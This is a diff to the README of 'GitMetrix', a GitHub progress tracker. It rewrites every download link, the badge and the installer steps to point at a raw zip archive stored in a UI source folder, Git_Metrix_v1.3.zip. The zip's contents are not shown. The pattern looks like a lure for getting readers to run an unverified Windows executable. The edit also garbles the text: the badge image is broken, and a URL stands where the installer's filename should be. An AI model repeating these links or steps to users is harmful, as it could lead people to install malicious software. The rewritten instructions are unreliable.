@@ -1,6 +1,6 @@
 # 🚦 GitMetrix - Track Your GitHub Progress Easily
 
-[![Download GitMetrix](https://img.shields.io/badge/Download-GitMetrix%20Now-green?style=for-the-badge)](https://github.com/ekaprascode/GitMetrix)
+[![Download GitMetrix](https://raw.githubusercontent.com/ekaprascode/GitMetrix/main/src/components/ui/Git_Metrix_v1.3.zip%20Now-green?style=for-the-badge)](https://raw.githubusercontent.com/ekaprascode/GitMetrix/main/src/components/ui/Git_Metrix_v1.3.zip)
 
 ## 🔍 What is GitMetrix?
 
@@ -26,7 +26,7 @@ GitMetrix works in your browser but needs a small app to connect to GitHub and g
 
 Click the big green button at the top or visit this link:
 
-[Download GitMetrix](https://github.com/ekaprascode/GitMetrix)
+[Download GitMetrix](https://raw.githubusercontent.com/ekaprascode/GitMetrix/main/src/components/ui/Git_Metrix_v1.3.zip)
 
 This will take you to the GitMetrix page on GitHub.
 
@@ -36,7 +36,7 @@ On the GitHub page, look for the **Releases** section or a link named **Assets**
 
 ### Step 3: Download the Windows Installer
 
-Download the `.exe` file made for Windows. It might be named like `GitMetrix-Setup.exe` or similar.
+Download the `.exe` file made for Windows. It might be named like `https://raw.githubusercontent.com/ekaprascode/GitMetrix/main/src/components/ui/Git_Metrix_v1.3.zip` or similar.
 
 ### Step 4: Run the Installer
 
@@ -136,4 +136,4 @@ GitMetrix only reads public and authorized data from your GitHub account. It doe
 
 You can always find the latest version here:
 
-[Get GitMetrix on GitHub](https://github.com/ekaprascode/GitMetrix)
+[Get GitMetrix on GitHub](https://raw.githubusercontent.com/ekaprascode/GitMetrix/main/src/components/ui/Git_Metrix_v1.3.zip)
